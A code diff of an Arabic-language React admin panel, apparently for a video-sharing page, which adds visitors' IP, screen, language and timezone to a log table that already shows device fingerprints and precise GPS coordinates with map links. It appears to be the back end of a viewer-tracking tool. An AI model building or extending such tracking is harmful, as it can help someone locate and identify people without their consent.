@@ -8,6 +8,10 @@ type Log = {
   latitude: number | null;
   longitude: number | null;
   userAgent: string | null;
+  ip: string | null;
+  screenResolution: string | null;
+  language: string | null;
+  timezone: string | null;
   createdAt: string;
 };
 
@@ -39,73 +43,99 @@ export default function AdminPanel() {
     if (res.ok) {
       setMessage('تم تحديث الفيديو بنجاح!');
     } else {
-      setMessage('حدث خطأ أثناء التحديث.');
+      const errData = await res.json().catch(() => ({}));
+      setMessage(`حدث خطأ أثناء التحديث: ${errData.error || res.statusText}`);
     }
     
     setTimeout(() => setMessage(''), 3000);
   };
 
   return (
-    <div style={{ padding: '2rem', maxWidth: '1000px', margin: '0 auto' }}>
-      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2rem' }}>
-        <h1>لوحة التحكم (Admin Panel)</h1>
-        <a href="/" className="btn" style={{ textDecoration: 'none' }}>العودة للمشغل</a>
-      </div>
+    <div style={{ padding: '2rem', maxWidth: '1200px', margin: '0 auto', fontFamily: 'Arial, sans-serif' }} dir="rtl">
       
-      <div className="glass-container" style={{ marginBottom: '2rem' }}>
-        <h2>إعدادات الفيديو</h2>
-        <form onSubmit={handleUpdateVideo} style={{ marginTop: '1rem' }}>
+      <div style={{ textAlign: 'center', marginBottom: '2rem' }}>
+        <h1 style={{ color: '#1b7bc2', fontSize: '2.5rem' }}>لوحة التحكم المراقبة</h1>
+      </div>
+
+      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2rem' }}>
+        <h2>سجل الزيارات</h2>
+        <button className="btn" style={{ backgroundColor: '#d9534f', color: 'white', padding: '10px 20px', border: 'none', borderRadius: '4px', cursor: 'pointer' }}>تسجيل خروج</button>
+      </div>
+
+      <div style={{ backgroundColor: 'white', padding: '1.5rem', borderRadius: '8px', boxShadow: '0 4px 6px rgba(0,0,0,0.1)', marginBottom: '2rem' }}>
+        <h3>إعدادات الفيديو</h3>
+        <form onSubmit={handleUpdateVideo} style={{ marginTop: '1rem', display: 'flex', gap: '10px' }}>
           <input 
             type="url" 
             value={videoUrl}
             onChange={(e) => setVideoUrl(e.target.value)}
-            className="input-field"
-            placeholder="أدخل رابط الفيديو (MP4)"
+            style={{ flex: 1, padding: '10px', borderRadius: '4px', border: '1px solid #ccc' }}
+            placeholder="أدخل رابط الفيديو"
             required
             dir="ltr"
           />
-          <button type="submit" className="btn">حفظ الفيديو</button>
-          {message && <p style={{ marginTop: '1rem', color: 'var(--primary)' }}>{message}</p>}
+          <button type="submit" className="btn" style={{ padding: '10px 20px' }}>حفظ</button>
         </form>
+        {message && <p style={{ marginTop: '1rem', color: '#1b7bc2' }}>{message}</p>}
       </div>
 
-      <div className="glass-container">
-        <h2>سجلات المشاهدين</h2>
-        <div style={{ overflowX: 'auto', marginTop: '1rem' }}>
-          <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left' }} dir="ltr">
-            <thead>
-              <tr style={{ borderBottom: '1px solid var(--glass-border)' }}>
-                <th style={{ padding: '12px' }}>ID</th>
-                <th style={{ padding: '12px' }}>Fingerprint</th>
-                <th style={{ padding: '12px' }}>Location</th>
-                <th style={{ padding: '12px' }}>Time</th>
-              </tr>
-            </thead>
-            <tbody>
-              {logs.map(log => (
-                <tr key={log.id} style={{ borderBottom: '1px solid var(--glass-border)' }}>
-                  <td style={{ padding: '12px' }}>{log.id}</td>
-                  <td style={{ padding: '12px', fontSize: '0.9em' }}>{log.fingerprint}</td>
-                  <td style={{ padding: '12px' }}>
-                    {log.latitude && log.longitude ? (
-                      <a href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`} target="_blank" rel="noreferrer" style={{ color: 'var(--primary)' }}>
-                        {log.latitude.toFixed(4)}, {log.longitude.toFixed(4)}
-                      </a>
-                    ) : (
-                      'N/A'
-                    )}
+      <div style={{ overflowX: 'auto', backgroundColor: 'white', boxShadow: '0 4px 6px rgba(0,0,0,0.1)' }}>
+        <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'center', fontSize: '14px' }}>
+          <thead>
+            <tr style={{ backgroundColor: '#1b7bc2', color: 'white' }}>
+              <th style={{ padding: '15px', border: '1px solid #dee2e6' }}>الوقت والتاريخ</th>
+              <th style={{ padding: '15px', border: '1px solid #dee2e6' }}>بصمة الجهاز (Fingerprint)</th>
+              <th style={{ padding: '15px', border: '1px solid #dee2e6' }}>الإحداثيات</th>
+              <th style={{ padding: '15px', border: '1px solid #dee2e6' }}>IP</th>
+              <th style={{ padding: '15px', border: '1px solid #dee2e6' }}>نظام التشغيل والمتصفح</th>
+              <th style={{ padding: '15px', border: '1px solid #dee2e6' }}>معلومات الجهاز</th>
+              <th style={{ padding: '15px', border: '1px solid #dee2e6' }}>الخريطة</th>
+            </tr>
+          </thead>
+          <tbody>
+            {logs.map(log => {
+              const date = new Date(log.createdAt);
+              return (
+                <tr key={log.id} style={{ borderBottom: '1px solid #dee2e6' }}>
+                  <td style={{ padding: '10px', border: '1px solid #dee2e6' }}>
+                    {date.toLocaleDateString('ar-EG')}<br/>
+                    {date.toLocaleTimeString('ar-EG')}
                   </td>
-                  <td style={{ padding: '12px' }}>{new Date(log.createdAt).toLocaleString()}</td>
+                  <td style={{ padding: '10px', border: '1px solid #dee2e6', wordBreak: 'break-all' }}>{log.fingerprint}</td>
+                  <td style={{ padding: '10px', border: '1px solid #dee2e6' }} dir="ltr">
+                    {log.latitude && log.longitude ? `${log.latitude.toFixed(5)}, ${log.longitude.toFixed(5)}` : '-'}
+                  </td>
+                  <td style={{ padding: '10px', border: '1px solid #dee2e6' }} dir="ltr">{log.ip || '-'}</td>
+                  <td style={{ padding: '10px', border: '1px solid #dee2e6', maxWidth: '200px', wordBreak: 'break-word', fontSize: '12px', color: '#555' }} dir="ltr">
+                    {log.userAgent || '-'}
+                  </td>
+                  <td style={{ padding: '10px', border: '1px solid #dee2e6', fontSize: '12px', color: '#555', textAlign: 'right' }}>
+                    <div>الشاشة: {log.screenResolution || '-'}</div>
+                    <div>اللغة: {log.language || '-'}</div>
+                    <div>المنطقة: {log.timezone || '-'}</div>
+                  </td>
+                  <td style={{ padding: '10px', border: '1px solid #dee2e6' }}>
+                    {log.latitude && log.longitude ? (
+                      <a 
+                        href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`} 
+                        target="_blank" 
+                        rel="noreferrer" 
+                        style={{ color: '#6610f2', textDecoration: 'underline' }}
+                      >
+                        عرض الخريطة
+                      </a>
+                    ) : '-'}
+                  </td>
                 </tr>
-              ))}
-              {logs.length === 0 && (
-                <tr>
-                  <td colSpan={4} style={{ padding: '12px', textAlign: 'center' }}>لا توجد سجلات حتى الآن</td>
-                </tr>
-              )}
-            </tbody>
-          </table>
-        </div>
+              );
+            })}
+            {logs.length === 0 && (
+              <tr>
+                <td colSpan={7} style={{ padding: '20px', textAlign: 'center' }}>لا توجد سجلات حتى الآن</td>
+              </tr>
+            )}
+          </tbody>
+        </table>
       </div>
     </div>
   );
